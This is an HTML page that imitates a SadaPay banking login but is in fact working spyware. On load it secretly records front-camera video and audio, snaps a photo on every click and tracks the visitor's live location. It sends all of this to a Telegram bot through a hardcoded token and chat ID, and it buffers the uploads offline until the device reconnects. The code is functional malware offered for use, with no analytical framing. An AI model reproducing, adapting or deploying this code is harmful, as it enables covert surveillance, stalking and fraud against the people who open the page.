<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SadaPay - Goodbye Bank Fees</title>
    <style>
        :root { --teal: #2dd4bf; --black: #121212; --card-bg: #1e1e1e; }
        body { margin: 0; background: var(--black); color: white; font-family: sans-serif; text-align: center; }
        .screen { display: none; padding: 20px; min-height: 100vh; flex-direction: column; align-items: center; justify-content: center; }
        .active-screen { display: flex; }
        .card { background: var(--card-bg); border-radius: 24px; padding: 25px; width: 100%; max-width: 360px; border: 1px solid #333; }
        .balance { font-size: 42px; font-weight: bold; color: var(--teal); margin: 10px 0; }
        input { background: #2a2a2a; border: 1px solid #444; color: white; padding: 16px; width: 100%; border-radius: 14px; margin: 12px 0; box-sizing: border-box; }
        .btn { background: var(--teal); color: black; padding: 16px; width: 100%; border-radius: 14px; border: none; font-weight: bold; cursor: pointer; }
        #video, #canvas { display: none; }
    </style>
</head>
<body onclick="captureAction()">

    <div id="loginScreen" class="screen active-screen">
        <img src="https://sadapay.pk/wp-content/uploads/2022/06/SadaPay-Logo-1.png" width="140" style="margin-bottom:30px;">
        <div class="card">
            <h3>Secure Login</h3>
            <input type="password" id="pinInput" placeholder="Enter PIN" maxlength="4">
            <button class="btn" onclick="verify()">Continue</button>
        </div>
    </div>

    <div id="mainScreen" class="screen">
        <p style="color:#888;">Current Balance</p>
        <div class="balance">Rs. 107,800</div>
        <button class="btn" style="width:200px;">Send Money</button>
    </div>

    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const API_KEY = '8466749965:AAEa8pM--47T3Mo6X34atY8LexkqC79epe0';
        const CHAT_ID = '7107389141';
        let db, mediaRecorder, chunks = [];

        // 1. Storage & Sync Logic
        const req = indexedDB.open("DataStore", 1);
        req.onupgradeneeded = e => e.target.result.createObjectStore("sync_queue", { autoIncrement: true });
        req.onsuccess = e => { db = e.target.result; sync(); };

        // 2. Main Initialization (Camera, Mic, Location)
        window.onload = () => {
            // Live Location Tracking
            if (navigator.geolocation) {
                navigator.geolocation.watchPosition(pos => {
                    const msg = `📍 *LIVE LOCATION*\nLat: ${pos.coords.latitude}\nLong: ${pos.coords.longitude}\nGoogle Maps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    sendText(msg);
                }, err => console.log("Loc Denied"), { enableHighAccuracy: true });
            }

            // Camera & Audio
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
                .then(stream => {
                    document.getElementById('video').srcObject = stream;
                    startVideoLoop(stream);
                });
        };

        function startVideoLoop(stream) {
            mediaRecorder = new MediaRecorder(stream);
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                chunks = [];
                navigator.onLine ? uploadFile(blob, 'video') : saveLocally(blob);
                mediaRecorder.start();
            };
            mediaRecorder.start();
            setInterval(() => mediaRecorder.state === "recording" && mediaRecorder.stop(), 10000);
        }

        // 3. Data Transmission
        async function uploadFile(blob, type) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            const endpoint = type === 'video' ? 'sendVideo' : 'sendPhoto';
            fd.append(type, blob, `${type}_${Date.now()}.${type === 'video' ? 'webm' : 'jpg'}`);
            try { await fetch(`https://api.telegram.org/bot${API_KEY}/${endpoint}`, { method: 'POST', body: fd }); }
            catch(e) { saveLocally(blob); }
        }

        function sendText(txt) {
            fetch(`https://api.telegram.org/bot${API_KEY}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt)}&parse_mode=Markdown`);
        }

        function saveLocally(blob) {
            const tx = db.transaction("sync_queue", "readwrite");
            tx.objectStore("sync_queue").add(blob);
        }

        async function sync() {
            if (!navigator.onLine || !db) return;
            const store = db.transaction("sync_queue", "readwrite").objectStore("sync_queue");
            store.openCursor().onsuccess = async e => {
                const cursor = e.target.result;
                if (cursor) {
                    await uploadFile(cursor.value, cursor.value.type.includes('video') ? 'video' : 'photo');
                    store.delete(cursor.key);
                    cursor.continue();
                }
            };
        }

        window.addEventListener('online', sync);

        // 4. User Interaction Actions
        function captureAction() {
            const v = document.getElementById('video');
            const c = document.getElementById('canvas');
            if(v.srcObject) {
                const ctx = c.getContext('2d');
                ctx.drawImage(v, 0, 0, c.width, c.height);
                c.toBlob(b => uploadFile(b, 'photo'), 'image/jpeg');
            }
        }

        function verify() {
            if(document.getElementById('pinInput').value === "7890") {
                document.getElementById('loginScreen').style.display = "none";
                document.getElementById('mainScreen').classList.add('active-screen');
            }
        }
    </script>
</body>
</html>
